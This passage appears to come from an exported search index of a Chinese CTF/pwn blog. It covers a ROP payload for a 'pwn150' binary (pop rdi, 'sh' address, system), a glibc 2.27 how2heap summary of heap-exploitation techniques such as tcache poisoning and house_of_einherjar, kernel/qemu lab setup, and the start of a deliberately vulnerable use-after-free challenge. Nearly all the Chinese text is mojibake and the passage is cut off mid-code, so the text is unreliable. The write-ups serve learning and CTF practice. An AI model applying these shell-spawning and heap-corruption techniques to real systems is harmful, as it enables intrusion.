\"pop rdi\"\n```\n\n4.ç„¶åéœ€è¦systemå‡½æ•°çš„åœ°å€ï¼Œè¿™é‡Œtodayå‡½æ•°ç›´æ¥calläº†è¯¥å‡½æ•°ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨IDAåœ¨æ±‡ç¼–ä¸­çœ‹åˆ°è¯¥åœ°å€(è¡Œçš„å‰ç¼€)ã€‚æˆ–è€…å…ˆctrl + sï¼Œåœ¨got.pltä¸­æœç´¢ä¸€ä¸‹ï¼Œå‘ç°ä¹Ÿèƒ½æ‰¾åˆ°systemå‡½æ•°ã€‚æ‰€ä»¥è¿™é‡Œè·å–systemåœ°å€æˆ‘ä»¬å¯ä»¥æœ‰ä¸¤ç§æ–¹æ³•ï¼š\n\nâ‘ pop rdiä¹‹åï¼Œè®©retæŒ‡å‘todayå‡½æ•°ä¸­çš„call_system_åœ°å€ï¼š0x40075F\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191553103.jpeg)\n\nâ‘¡pop rdiä¹‹åï¼Œè®©retæŒ‡å‘ä»elf = ELF('./pwn150')å’Œsystem_addr = p64(elf.symbols['system'])ä¸­æ‰¾åˆ°çš„åœ°å€system_addrï¼Œä¹Ÿå°±æ˜¯pltè¡¨ä¸­çš„åœ°å€(è¿™é‡Œå…¶å®å¯ä»¥ç›´æ¥åœ¨IDAä¸­æ‰¾åˆ°)\n\n(ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™æ˜¯64ä½ç¨‹åºï¼Œsystemå‡½æ•°ä»rdiä¸Šå–å€¼ï¼Œä¸æ ˆæ— å…³ç³»ï¼Œæ‰€ä»¥callå’Œç›´æ¥è·³è½¬pltå·®ä¸å¤šï¼Œä½†æ˜¯å¦‚æœæ˜¯32ä½ç¨‹åºï¼Œé‚£ä¹ˆå¸ƒç½®æ ˆçš„æ—¶å€™å°±éœ€è¦è€ƒè™‘åˆ°pltè¡¨å’Œç›´æ¥call systemå‡½æ•°çš„ä¸åŒäº†ã€‚å¦‚æœæ˜¯ç›´æ¥è·³è½¬pltè¡¨ä¸­çš„åœ°å€ï¼Œé‚£ä¹ˆæ ˆçš„å¸ƒç½®é¡ºåºåº”è¯¥æ˜¯ï¼š\n\n**systemå‡½æ•°-systemå‡½æ•°çš„è¿”å›åœ°å€-sytemå‡½æ•°çš„å‚æ•°ã€‚**\n\nä½†å¦‚æœæ˜¯è·³è½¬call systemï¼Œé‚£ä¹ˆç”±äºcallæŒ‡ä»¤ä¼šè‡ªåŠ¨pushè¿›eipï¼Œåˆ™æ ˆå¸ƒç½®åº”è¯¥ä¸ºï¼š\n\n**call systemå‡½æ•°åœ°å€-systemå‡½æ•°å‚æ•°ã€‚**\n\nä¸¤è€…ä¸å¤ªä¸€æ ·ï¼Œéœ€è¦åŠ ä»¥åŒºåˆ†ã€‚åé¢ä¼šæœ‰gotè¡¨å’Œpltçš„è¯¦ç»†è®²è§£)\n\n4.æ¥ä¸‹æ¥å¯»æ‰¾binshå­—ç¬¦ä¸²ï¼Œä½†æ˜¯æ²¡æ‰¾åˆ°ï¼Œåªæœ‰shï¼Œä¹Ÿå¯ä»¥å¼€shellã€‚shift+F12è¿›å…¥å­—ç¬¦ä¸²åå³é”®åœ¨åå…­è¿›åˆ¶ä¸­åŒæ­¥ï¼Œä¹‹åå¯ä»¥å¯¹åº”çœ‹åˆ°shçš„å­—ç¬¦åœ°å€ï¼Œç”±äºshä¹‹åç›´æ¥å°±æ˜¯ç»“æŸå­—ç¬¦00ï¼Œä¸ä¼šå¾€åå¤šè¯»ï¼Œè€Œåªä¼šè¯»å–shï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥å°†è¯¥å­—ç¬¦ä¸²çš„åœ°å€å†™åœ¨pop rdiåœ°å€åé¢ï¼Œç›´æ¥èµ‹å€¼ç»™rdiï¼Œå†™è¿›å»ã€‚\n\n5.ç¼–å†™payloadï¼Œé¡ºåºä¸ºï¼špayload = padding + pop_rdi_addr + bin_sh_addr + system_addrï¼ˆæˆ–è€…æ˜¯call_system_addrï¼‰ã€‚\n\n \n\nâ–²ç”±äº64ä½ç¨‹åºä¸­é€šå¸¸å‚æ•°ä»å·¦åˆ°å³ä¾æ¬¡æ”¾åœ¨rdi, rsi, rdx, rcx, r8, r9ï¼Œå¤šå‡ºæ¥çš„å‚æ•°æ‰ä¼šå…¥æ ˆï¼ˆæ ¹æ®è°ƒç”¨çº¦å®šçš„æ–¹å¼å¯èƒ½æœ‰ä¸åŒï¼Œé€šå¸¸æ˜¯è¿™æ ·ï¼‰ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬å°±éœ€è¦ä¸€ä¸ªç»™RDIèµ‹å€¼çš„åŠæ³•ã€‚ä¹Ÿå°±æ˜¯ROPgadget --pwn150 | grep â€œpop rdiâ€è¿™æ®µä»£ç è·å–ã€‚æ‰€ä»¥è¿›å…¥systemä¸­ç”¨callå’Œreturnç›´æ¥è¿›éƒ½è¡Œï¼Œå‚æ•°æ˜¯ä»rdiä¸­è·å–çš„ï¼Œè¿›å»ä¹‹åæ ˆä¸Šçš„è¿”å›åœ°å€æ˜¯å•¥éƒ½æ²¡å…³ç³»ï¼Œå› ä¸ºå·²ç»getshellï¼Œç”¨ä¸åˆ°ã€‚\n\nâ–²æ‰§è¡Œcall func_addræŒ‡ä»¤ç›¸å½“äºpush eip ;jmp func_addrï¼Œè€Œæ‰§è¡Œpltè¡¨ä¸­åœ°å€åˆ™ç›¸å½“äºåªæœ‰jmp func_addrï¼Œæ²¡æœ‰å‰é¢çš„push eipï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨è®¾ç½®è¿™ä¸ªeipï¼Œè€Œcallåˆ™ä¸ç”¨ã€‚æ³¨æ„è¿™æ˜¯32ä½ç¨‹åºä¸‹ï¼Œ64ä½ç¨‹åºä¸‹åˆ™æŒ‰ç…§æœ¬ç¯‡æ‰€è¯´ï¼Œç›´æ¥pop rdiå³å¯ã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["ROP"],"categories":["PWN","ROP0x3"]},{"title":"how2heap_libc2.27_summary","url":"/2021/08/14/how2heap_libc2.27_summary/","content":"\n\\1. fastbin_dup:\nå¡«æ»¡Tcacheåfree(a),free(b),free(a)ä¹‹åå³å¯ã€‚\n\n\\2. fastbin_reverse_into_tcache:\n(1)ç”³è¯·14ä¸ªchunkï¼Œéƒ½é‡Šæ”¾æ‰0-6è¿›å…¥tcacheï¼Œ7-13è¿›å…¥fastbinä¸­ã€‚(è¿™14ä¸ªchunkå¤§å°éœ€ç›¸ç­‰)\n(2)æ­¤æ—¶mallcoæ‰7ä¸ªchunkï¼Œå°±å¯ä»¥å°†tcacheä¸­çš„7ä¸ªchunkéƒ½ç”³è¯·å‡ºæ¥ã€‚\n(3)å†åˆ©ç”¨æ¼æ´ä¿®æ”¹chunk7çš„fdä¸ºæ ˆä¸Šçš„åœ°å€(ä»»æ„åœ°å€)ï¼Œè¿™æ—¶å†mallocä¸€æ¬¡ï¼Œå°±ä¼šä»fastbinä¸­ç”³è¯·chunkï¼Œç”±äºfastbinå…ˆè¿›åå‡ºçš„å…³ç³»ï¼Œä¼šå°†chunk13ç”³è¯·å‡ºæ¥ã€‚åŒæ—¶ç”±äºtcacheæœºåˆ¶ï¼Œå½“fastbinä¸­å¯¹åº”å¤§å°çš„binä¸­è¿˜å­˜åœ¨chunkï¼Œå°±ä¼šå°†è¿™äº›Chunkéƒ½æ‹¿å‡ºæ¥æ”¾è¿›å¯¹åº”å¤§å°çš„tcacheä¸­ã€‚\n(4)ç”±äºå…ˆè¿›åå‡ºçš„å…³ç³»ä¸å˜ï¼Œæ‹¿å‡ºé¡ºåºä¸ºchunk12,chunk11â€¦chunk7ã€‚è¿›å…¥tcacheåçš„é¡ºåºä¸ºchunk7,chunk8â€¦.chunk12ã€‚\n(5)è¿™æ ·åˆç”±äºchunk7çš„fdè¢«æˆ‘ä»¬æ”¹æ‰äº†ï¼Œæ‰€ä»¥å®é™…çš„é¡ºåºä¸ºchunk7->chunk7.fd->chunk8â€¦\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191449078.png)\n(6)åŒæ—¶é‡Šæ”¾å¯ä»¥å‘æ ˆä¸Šå†™å…¥å †åœ°å€ï¼Œä¹‹åå†è¿ç»­ç”³è¯·å°±å¯ä»¥å°†ä»æ ˆä¸Šç”³è¯·chunkã€‚\n\n\\3. house_of_botcake(åªèƒ½åœ¨double freeå‰æä¸‹ä½¿ç”¨)ï¼š\n(1)ç”³è¯·chunk0-chunk6ç”¨äºå¡«å……tcacheï¼Œç„¶åç”³è¯·chunk7,chunk8,chunk9ï¼Œå…¶ä¸­chunk9ç”¨äºé˜²æ­¢å’Œtopchunkåˆå¹¶\n(2)é‡Šæ”¾chunk0-chunk6å¡«å……tcacheï¼Œé‡Šæ”¾chunk7ï¼Œchunk8ï¼Œå‘ç”Ÿåˆå¹¶è¿›å…¥unsortedbinä¸­ï¼Œç§°ä¸ºchunk_Uã€‚\n(3)mallocä¸€æ¬¡ï¼Œå°†chunk6ä»tcacheä¸­ç”³è¯·å‡ºæ¥ï¼Œç„¶åå†é‡Šæ”¾chunk8(double free)ï¼Œè¿™æ ·chunk8å°±ä¼šè¿›å…¥tcacheä¸­ã€‚ç°åœ¨chunk8å°±ä¼šæ—¢åœ¨tcacheä¸­ï¼Œåˆè¢«åŒ…å«åœ¨unsortedbinçš„chunk_Cä¸­ã€‚\n(4)å†ç”³è¯·ä¸€æ¬¡å¤§å°å¤§äºä»¥ä¸Šchunk_sizeçš„chunk_Cï¼Œè¿™ä¸ªchunk_Cå°±ä¼šå°†chunk_Uåˆ‡å‰²ï¼ŒåŒæ—¶ä½¿å¾—chunk_CåŒ…å«chunk8ï¼Œè¿™æ ·å°±å¯ä»¥ä»chunk_Cä¿®æ”¹chunk8çš„fdæŒ‡é’ˆã€‚\n(5)ç”±äºchunk8åŒæ—¶è¿˜åœ¨tcacheä¸­ï¼Œé‚£ä¹ˆå†è¿ç»­ä¸¤æ¬¡chunk8å¤§å°çš„sizeå°±å¯ä»¥å°†chunk8å’Œchunk8.fdç”³è¯·å‡ºæ¥ï¼Œå®ç°ä»»æ„åœ°å€ç”³è¯·å †å—ã€‚\n\n\\4. house_of_einherjar(éœ€è¦æ³„éœ²å †åœ°å€)ï¼š\n(1)ç”³è¯·3ä¸ªchunkï¼Œchunka,chunkb,chunkcï¼Œcçš„çœŸå®sizeå¤§äº0x100ï¼›\n(2)ç„¶åé€šè¿‡chunkbçš„å †æº¢å‡º(off by one/null)ï¼Œä¿®æ”¹chunkcçš„in_useä½ä¸º0ï¼Œå¹¶ä¸”åœ¨chunkcçš„prev_sizeå¤„ä¼ªé€ fake_prev_size=chunkb+chunka-0x10ï¼›\n(3)åœ¨chunkaä¸­ä¼ªé€ chunkï¼Œæ»¡è¶³è¦æ±‚ï¼š\n&Fake_chunk = chunka+0x10\nFake_chunk->size = sizeof(chunka) -0x10+sizeof(chunkb)\nFake_chunk->fd = Fake_chunk\nFake_chunk->bk = Fake_chunk\nç”¨ä»¥ç»•è¿‡unlinkçš„æ£€æŸ¥ã€‚\n(4)éšåç”³è¯·7ä¸ªä¸chunkcåŒå¤§å°çš„chunkï¼Œé‡Šæ”¾å¡«å……tcacheï¼›\n(5)é‡Šæ”¾chunkcï¼Œå› ä¸ºchunkcçš„prev_inuseä½è¢«ç½®ä¸º0ï¼Œæ‰€ä»¥ä¼šå‘ä¸Šåˆå¹¶ï¼Œé€šè¿‡fake_prev_sizeæ‰¾åˆ°å‰ä¸€ä¸ªå †å—ï¼Œå³fake_chunkï¼Œå¹¶æ¯”è¾ƒfake_prev_sizeä¸fake_chunkçš„sizeæ˜¯å¦ç›¸ç­‰ï¼Œå¦‚æœç›¸ç­‰åˆ™å‘ç”Ÿå †åˆå¹¶ï¼Œè¿›å…¥unlinkè„±é“¾ã€‚\n(6)æ­¤æ—¶åˆå¹¶çš„å †å—ï¼Œä¼šè¢«æ”¾å…¥unsortedbinä¸­ï¼Œè€Œæ­¤æ—¶çš„chunkbè¿˜å¤„äºä½¿ç”¨çŠ¶æ€ï¼Œé‡Šæ”¾chunkbï¼ˆå› ä¸ºå…¶å¤§å°ä¸å‰é¢tcacheå¤§å°ä¸åŒï¼Œä¼šè¢«æ”¾å…¥æ–°çš„tcachebinä¸­ï¼‰ã€‚\n(7)å†ç”³è¯·ä¸€ä¸ªå¤§äºchunkcå¤§å°çš„chunkï¼Œä¼šç›´æ¥ä»unsortedbinä¸­å»å¯»æ‰¾åˆ’åˆ†ï¼Œè¯¥chunkå°±æ˜¯fakechunk+chunkbï¼Œä¸”åˆç†é…ç½®chunkaå’Œchunkcçš„å¤§å°ä½¿å¾—èƒ½å¤Ÿè¦†ç›–åˆ°chunkbçš„æ•°æ®ï¼Œéšåé€šè¿‡ç”³è¯·å›æ¥çš„è¯¥chunkæ”¹å†™chunkbçš„fdæŒ‡é’ˆï¼Œå°†chunkbç”³è¯·å›æ¥ï¼Œå†æ¬¡ç”³è¯·å°±èƒ½å¤Ÿå®ç°tcache poisoningæ”»å‡»ã€‚\nè¿™é‡Œå’Œ2.23æœ‰ç‚¹ä¸å¤ªä¸€æ ·ï¼Œè¿™é‡Œåˆ©ç”¨çš„æ˜¯å†é‡Šæ”¾chunkbä»è€Œä½¿å¾—å…¶è¿›å…¥tcacheï¼Œä¿®æ”¹fdåˆ¶é€ tcache poisoningï¼Œå› ä¸ºtcacheä¸ä¼šæ£€æŸ¥sizeï¼Œåªè¦fdå°±å¯ä»¥ä»»æ„ç”³è¯·ã€‚\n\n\\5. house_of_force:ä¸€æ ·çš„ï¼Œæ²¡å¤šå¤§å·®åˆ«\n\n6.house_of_lore:å’Œ2.23å·®ä¸å¤šï¼Œæ²¡å¤šå¤§å·®åˆ«\n\n7.large_bin_attack:å’Œ2.23åŸºæœ¬ä¸€æ ·ã€‚\n\n\\8. overlapping_chunks(èƒ½å¤Ÿæº¢å‡ºä¿®æ”¹sizeä½)ï¼š\nåªæœ‰freeä¹‹åä¿®æ”¹sizeçš„äº†.\n\n\\9. poison_null_byte:\nä¸2.23å·®ä¸å¤šï¼Œä¸è¿‡éœ€è¦è€ƒè™‘åˆ°tcacheçš„å½±å“ï¼Œæœ‰æ—¶å€™éœ€è¦å…ˆå¡«æ»¡tcacheã€‚ä¸€èˆ¬æƒ…å†µæ˜¯4ä¸ªchunkï¼Œæœ€åä¸€ä¸ªchunké˜²æ­¢åˆå¹¶ï¼Œå‰ä¸‰ä¸ªchunkç”¨æ¥åˆ¶é€ å †å—é‡å ï¼Œä½†æ˜¯ä¸­é—´å…¶å®å¯ä»¥æ’å…¥è¾ƒå¤šçš„å †å—ï¼Œåˆ¶é€ å¤šä¸ªå †å—é‡å ï¼Œæ–¹ä¾¿åˆ©ç”¨ã€‚\n\n\\10. tcache_dup:åŸºæœ¬æ²¡å•¥ç”¨ï¼Œç°åœ¨2.27ä¹ŸåŸºæœ¬éƒ½ä¿®å¤äº†è¿™ä¸ªé—®é¢˜ï¼Œä¸è¿‡åšé¢˜çš„æ—¶å€™å¯ä»¥å°è¯•ä¸€ä¸‹çœ‹è¡Œä¸è¡Œã€‚2.28å°±å·²ç»å¢åŠ äº†keyå­—æ®µæ£€æŸ¥\n\n11.tcache_ house_of_spirit:\nä¸house_of_spiritä¸€æ ·ï¼Œä¿®æ”¹æ ˆä¸Šçš„çš„chunkæŒ‡é’ˆä¸ºæ ˆä¸Šçš„åœ°å€ï¼Œåœ¨æ ˆä¸Šä¼ªé€ chunkï¼Œåªéœ€è¦ä¼ªé€ sizeå³å¯ï¼Œæ³¨æ„in_useä½çš„è®¾ç½®ã€‚åŒæ—¶ç”±äºtcacheåœ¨freeçš„æ—¶å€™ä¸ä¼šä¾æ®chunkçš„sizeæ¥å¯¹ä¸‹ä¸€ä¸ªchunkåšæ£€æŸ¥ï¼Œæ‰€ä»¥è¿™é‡Œä¸éœ€è¦ä¼ªé€ ä¸‹ä¸€ä¸ªchunkçš„sizeã€‚\n\n\\12. tcache_poisoningï¼š\nå·²ç»åœ¨tcacheé“¾è¡¨ä¸­çš„chunkï¼Œå¦‚æœä¿®æ”¹äº†fdï¼Œé‚£ä¹ˆç›´æ¥ä¸¤æ¬¡mallocå³å¯è·å¾—fdå¯¹åº”åœ°å€çš„chunkï¼Œä¸éœ€è¦æ„é€ å­—èŠ‚é”™ä½ï¼Œè€Œä¸”mallocä¹‹åå¾—åˆ°çš„chunkå…¶pre_sizeå’Œsizeéƒ½æ˜¯0ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191449154.png)\n\n\\13. Tcache Stashing Unlink Attack(éœ€è¦callocç”³è¯·chunkï¼Œèƒ½å¤Ÿæ§åˆ¶smallbinçš„bkæŒ‡é’ˆ)ï¼š\n(1)ç”³è¯·9ä¸ªchunkï¼Œchunk1-chunk9ï¼Œé‡Šæ”¾chunk4-chunk9è¿›å…¥tcacheä¸­ï¼Œé‡Šæ”¾chunk2è¿›å…¥tcacheï¼Œå†é¡ºåºé‡Šæ”¾chunk1å’ŒChunk3è¿›å…¥unsortedbinä¸­ã€‚\n(2)ç”³è¯·ä¸€ä¸ªlargebinå¤§å°çš„chunkï¼Œä½¿å¾—chunk1å’Œchunk3è¢«æ•´ç†åˆ°smallbinä¸­ã€‚\n(3)ç”³è¯·ä¸¤ä¸ªchunkï¼Œå°†chunk2å’Œchunk9ä»Tcacheä¸­ç”³è¯·å‡ºæ¥ï¼Œä½¿å¾—tcacheä¸­å­˜åœ¨ä¸¤ä¸ªç©ºä½ã€‚\n(4)åˆ©ç”¨UAFä¹‹ç±»çš„æ¼æ´ä¿®æ”¹chunk3çš„bkæŒ‡å‘fake_chunkï¼Œè¿™é‡Œçš„chunk3æ˜¯smallbinä¸­çš„ç¬¬ä¸€ä¸ªchunkï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191449159.png)\n\nå³ä¸ºå›¾ä¸­çš„0x602390çš„bkæŒ‡é’ˆï¼ŒæŒ‡å‘ä¸€ä¸ªfake_chunkï¼Œæ ˆä¸Šçš„åœ°å€ã€‚\n(5)åŒæ—¶ç”±äºsmallbinæŒ‰ç…§FIFOçš„é¡ºåºï¼Œæ‰€ä»¥ä¾æ®bkæŒ‡é’ˆè¿›è¡Œå¯»æ‰¾ï¼Œé‚£ä¹ˆå¦‚æœä»smallbinä¸­ç”³è¯·chunkï¼Œç”³è¯·é¡ºåºåº”è¯¥æ˜¯0x602250 â€”â–¸ 0x602390 â€”â–¸ 0x7fffffffdd10ã€‚\n(6)è°ƒç”¨callocï¼Œä½¿å¾—chunkä¸ä»tcacheä¸­ç”³è¯·ï¼Œä»smallbinä¸­ç”³è¯·ï¼Œé‚£ä¹ˆå°±ä¼šè§¦å‘ä¸‹åˆ—åœ¨ä½¿ç”¨smallbinæ—¶ï¼Œåªåœ¨use tcacheçš„å®å®šä¹‰ä¸­çš„ä»£ç ï¼š\n\n```\nwhile ( tcache->counts[tc_idx] < mp_.tcache_count\n&& (tc_victim = last (bin) ) != bin)\n{\n    //å¦‚æœæˆåŠŸè·å–äº†Chunk\n    if (tc_victim != 0)\n    {\n         // è·å– small bin ä¸­å€’æ•°ç¬¬äºŒä¸ª chunk ã€‚\n        bck = tc_victim->bk;\n        //è®¾ç½®æ ‡å¿—ä½\n        set_inuse_bit_at_offset (tc_victim, nb);\n        // å¦‚æœä¸æ˜¯ main_arenaï¼Œè®¾ç½®å¯¹åº”çš„æ ‡å¿—\n        if (av != &main_arena)\n            set_non_main_arena (tc_victim);\n        //å–å‡ºæœ€åä¸€ä¸ªChunk\n        bin->bk = bck;\n        bck->fd = bin;\n        //å°†å…¶æ”¾å…¥åˆ°Tcacheä¸­\n        tcache_put (tc_victim, tc_idx);\n    }\n}\n```\n\nè¿™æ ·å°±ä¼šå°†tc_victimï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œçš„0x602390ï¼Œé€šè¿‡tcache_putæ”¾å…¥åˆ°tcacheä¸­ï¼ŒåŒæ—¶tcache_putè¿™ä¸ªå‡½æ•°ä¸­æ²¡æœ‰ä»»ä½•çš„å®‰å…¨æ£€æŸ¥ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æ”¾å…¥ã€‚é‚£ä¹ˆç”±äºtcacheçš„FILOå…³ç³»ï¼Œä¾æ®fdæ¥ç”³è¯·ï¼Œ0x602390çš„fdä¸º0x7fffffffdd10(fakechunk)ï¼Œæ‰€ä»¥ä¼šå°†fakechunkæåˆ°tcacheçš„å¤´éƒ¨ã€‚åŒæ—¶åˆç”±äºtcacheä¸­çš„æŒ‡é’ˆæŒ‡å‘çš„æ˜¯chunkå¤´éƒ¨+0x10ï¼Œé‚£ä¹ˆåœ¨tcacheä¸­çš„é¡ºåºå°±æ˜¯\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191449163.png)\n\nè¿™é‡Œçš„0x7fffffffdd20å°±æ˜¯fakechunkï¼Œå†æ¬¡ç”³è¯·0xa0å¤§å°çš„chunkå°±å¯ä»¥å°†fakechunkç»™ç”³è¯·å‡ºæ¥ã€‚åŒæ—¶åˆç”±äºä»smallbiné“¾è¡¨ä¸­çš„unlinkä¸­çš„bck->fd = binçš„èµ‹å€¼æ“ä½œï¼Œä¼šå¯¼è‡´0x7fffffffdd20+0x10å¤„ä¼šè¢«èµ‹å€¼ä¸Šsmallbinçš„libcåœ°å€ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191449165.png)\n\nè¿™æ ·Tcache Stashing Unlink Attackä¿®æ”¹bkä¸ºtarget_addrï¼Œmallocåä¼šæ§åˆ¶target_addr-0x10ï¼Œä¼šåœ¨target_addr+0x10å¤„å†™å…¥main_arena_addrã€‚\n\n14.unsafe_unlink:å’Œ2.23å·®ä¸å¤šï¼Œå°±åªæ˜¯ç”³è¯·çš„chunkä½¿ä¹‹å¤§äº0x410ï¼Œä»è€Œä¸ä½¿ç”¨tcacheã€‚\n\n15.unsorted_bin_attack:ç”³è¯·è¾ƒå¤§çš„chunkä½¿å¾—ä»unsortedbinä¸­é‡æ–°ç”³è¯·chunkæ—¶ä¸ä¼šå°†è¯¥å¤§å°çš„chunkæ”¾å…¥å¯¹åº”çš„tcacheä¸­ã€‚æˆ–è€…ä¿®æ”¹tcacheç»“æ„ä½“çš„countsåŸŸï¼Œä½¿å¾—ç³»ç»Ÿè®¤ä¸ºè¯¥tcacheå·²ç»æ»¡äº†ï¼Œé‚£ä¹ˆå°±ä¸ä¼šæ”¾å…¥äº†ã€‚\n\nhttps://github.com/firmianay/CTF-All-In-One/blob/master/doc/3.1.8_heap_exploit_3.md#unsorted_bin_attack\n\n\\16. unsorted_bin_into_stack_attackï¼šå’Œ2.23å·®ä¸å¤šï¼Œåªè¦æ»¡è¶³chunkçš„å¤§å°å¤§äº0x408ä»è€Œä¸ä½¿ç”¨tcacheå³å¯ï¼Œæˆ–è€…èƒ½å¤Ÿä¿®æ”¹tcacheç»“æ„ä½“çš„countåŸŸã€‚\n\n \n","tags":["how2heap"],"categories":["PWN","how2heap"]},{"title":"kernelç¼–è¯‘","url":"/2021/08/14/kernelç¼–è¯‘/","content":"\n1.å®‰è£…ä¾èµ–ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nsudo apt-get install make gcc bison flex libssl-dev musl-tools\nsudo apt-get install libssl-dev\nsudo apt-get install gcc make libncurses5-dev openssl libssl-dev \nsudo apt-get install build-essential \nsudo apt-get install pkg-config\nsudo apt-get install libc6-dev\nsudo apt-get install bison\nsudo apt-get install flex\nsudo apt-get install libelf-dev\nsudo apt-get install libncurses5-dev libssl-dev \nsudo apt-get install build-essential openssl \nsudo apt-get install zlibc minizip \nsudo apt-get install libidn11-dev libidn11\n```\n\nå¯èƒ½æœ‰äº›é‡å¤çš„ï¼Œæ²¡äº‹ï¼Œå¤Ÿç¼–è¯‘ç¯å¢ƒå°±è¡Œã€‚\n\n2.ä¸‹è½½kernelæºç ï¼Œè§£å‹ï¼Œç¼–è¯‘ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\nwget https://mirror.tuna.tsinghua.edu.cn/kernel/-------------------\ntar -zvxf linux-4.4.70.tar.gz\ncd linux-4.4.70\nmake menuconfig\n//è¿™é‡Œè¿›å…¥ä¹‹åç›´æ¥escä¿å­˜é€€å‡ºå³å¯ï¼Œç›¸å…³çš„è®¾ç½®æ¥åˆ°ä¹‹åç”Ÿæˆçš„.configä¸­æ¥\n\nvim .config\n//å°†CONFIG_MODULE_SIG_ALL,CONFIG_MODULE_SIG_KEYå’ŒCONFIG_SYSTEM_TRUSTED_KEYSä¸‰é¡¹æ³¨é‡Šæ‰ï¼Œç¼–è¯‘æ—¶ç³»ç»Ÿä¼šè‡ªåŠ¨ç”Ÿæˆä¸€æ¬¡æ€§å¯†é’¥æ¥åŠ å¯†ï¼Œå¦å¤–è®°å¾—æŠŠCONFIG_DEBUG_INFO=yå»æ‰ï¼Œä¸ç„¶æ–°å†…æ ¸å¸¦debugä¿¡æ¯è¶…å¤§\n//è¿™é‡Œè¸©è¿‡å¾ˆå¤šå‘ï¼Œè™šæ‹Ÿæœºç›´æ¥çˆ†ç‚¸ï¼Œå„ç§é”™è¯¯ã€‚\n\nmake\n```\n\nä½†æ˜¯å¦‚æœéœ€è¦ç›´æ¥è°ƒè¯•ï¼Œåˆ™çœ‹å¤§ä½¬çš„å§ï¼š\n\nhttps://eternalsakura13.com/2018/04/13/qemu/\n\nç¼–è¯‘å®Œæˆä¹‹ååœ¨linux-4.4.70/arch/x86_64/boot/ä¸‹ä¿å­˜bzImageï¼Œç”¨æ¥å¯åŠ¨qemuï¼Œæ ¹ç›®å½•ä¸‹æœ‰vmlinuxï¼Œç”¨æ¥åˆ†æã€‚\n\n3.ä¸‹è½½busyboxæºç ï¼Œè§£å‹ï¼Œç¼–è¯‘ï¼Œåˆ¶ä½œæ ¹ç›®å½•ç³»ç»Ÿ\n\n```\n//æ³¨é‡Šå¤´\n\nwget https://busybox.net/downloads/busybox-1.19.4.tar.bz2\ntar -jxvf busybox-1.30.0.tar.bz2\ncd busybox-1.30.0\nmake menuconfig \n# Busybox Settings -> Build Options -> Build Busybox as a static binary\nmake install\n```\n\nä¹‹ååœ¨busybox-1.30.0/_install/ç›®å½•ä¸‹å°±æ˜¯æ ¹ç›®å½•æ–‡ä»¶ç³»ç»Ÿ\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191459296.jpeg)\n\nç„¶åå°±ç”¨cpioç”Ÿæˆä¸Šè¿°çš„rootfs.cpioï¼Œç”¨æ¥é…åˆbzImageå¯åŠ¨qemu\n\nfind ./* | cpio -H newc -o > rootfs.cpio\n\n4.å¯åŠ¨qemu:\n\n(1)å°†rootfs.cpioã€bzImageæ‹–åˆ°ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹\n\n(2)åˆ¶ä½œå¯åŠ¨æ–‡ä»¶ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\ntouch boot.sh\nvim boot.sh\n```\n\n(3)å°†ä¸‹åˆ—ä»£ç æ‹·å…¥ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n#! /bin/sh\nqemu-system-x86_64 \\\n-m 64M \\\n-kernel ./bzImage \\\n-initrd ./rootfs.cpio \\\n-append \"root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr\" \\\n-s \\\n-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\\n-nographic \\\n```\n\nå›¾å½¢åŒ–ç•Œé¢-nographicå’Œconsole=ttyS0é…åˆä½¿ç”¨ï¼Œå¯åŠ¨ç•Œé¢å°±å˜æˆç»ˆç«¯ã€‚\n\næœ€å./boot.shå³å¯å¯åŠ¨qemuè™šæ‹Ÿæœºã€‚\n\n \n\n \n\n \n\n \n\n \n\n","tags":["kernel-Knowledge"],"categories":["pwn-kernel"]},{"title":"note-UAF","url":"/2021/08/14/note-UAF/","content":"\n1.æºæ–‡ä»¶ï¼Œå¿˜è®°æ˜¯å“ªé‡Œçš„é¢˜äº†ã€‚\n\n```\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nstruct note *notelist[10];\nint count = 0;\n\nstruct note{\n  void (*print_note)();\n  char *content;\n};\n\nvoid print_note_content(struct note *ptr_n) \n{ \n  puts(ptr_n -> content); \n}\n\nvoid add_note(){\n  int i;\n  char buf[8];\n  int size;\n  if (count > 10)\n  {\n    puts(\"Full\");\n    return;\n  }\n  for (i = 0; i < 10; i++){\n    if (!notelist[i])\n    {\n      notelist[i] = (struct note *)malloc(sizeof(struct note));\n      if (!notelist[i])\n      {\n        puts(\"Alloca Error\");\n        exit(-1);\n      }\n      notelist[i] -> print_note = print_note_content;\n      printf(\"Note size :\");\n      read(0, buf, 8);\n      size = atoi(buf);\n      notelist[i] -> content = (char *)malloc(size);\n      if (!notelist[i] -> content) \n      {\n        puts(\"Alloca Error\");\n        exit(-1);\n      }\n      printf(\"Content :\");\n      read(0, notelist[i] -> content, size);\n      puts(\"Success !\");\n      count++;\n      break;\n    }\n  }\n}\n\nvoid del_note() \n{\n  char buf[4];\n  int idx;\n  printf(\"Index :\");\n  read(0, buf, 4);\n  idx = atoi(buf);\n  if (idx < 0 || idx >= count) \n  {\n    puts(\"Out of bound!\");\n    _exit(0);\n  }\n  if (notelist[idx]) \n  {\n    free(notelist[idx]->content);\n    